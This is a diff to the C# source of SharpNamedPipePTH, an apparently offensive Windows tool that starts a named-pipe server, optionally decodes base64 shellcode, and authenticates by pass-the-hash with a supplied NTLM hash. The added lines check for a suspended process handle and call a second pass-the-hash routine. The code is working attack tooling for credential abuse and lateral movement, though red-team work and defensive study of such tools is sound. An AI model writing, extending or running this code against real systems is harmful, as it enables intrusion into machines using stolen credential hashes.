@@ -4,9 +4,11 @@ using System.Runtime.InteropServices;
 using System.Security.Principal;
 using System.Security.AccessControl;
 
+
+
 namespace SharpNamedPipePTH
 {
-    class Program
+    public class Program
     {
 
         public static void Main(string[] args)
@@ -116,7 +118,7 @@ namespace SharpNamedPipePTH
 
             // Start Pipe Server
             Console.WriteLine("Starting Pipe Server Thread!");
-
+            
             if (shellcodegiven)
             {
                 byte[] shellcodebytes = Convert.FromBase64String(shellcode);
@@ -133,6 +135,24 @@ namespace SharpNamedPipePTH
             Console.WriteLine($"Connecting to the Named Pipe via Pass-the-Hash - using username {username}");
             Thread.Sleep(4000);
             SharpNamedPipePTH.NamedpipePTH.NamedPipePTH(username, domain, hash, pipename, ForceSMB1);
+
+            Console.WriteLine($"Waiting...");
+            Thread.Sleep(5000);
+
+            if (Globals.suspendedProcessHandle == IntPtr.Zero)
+            {
+                Console.WriteLine("Failed to get suspended process handle!");
+                return;
+            }
+            else
+            {
+                Console.WriteLine($"Process Handle: '{Globals.suspendedProcessHandle}'");
+            }
+
+
+
+            PTH.PassTheHash(username, domain, hash, false);
+
 
         }
 
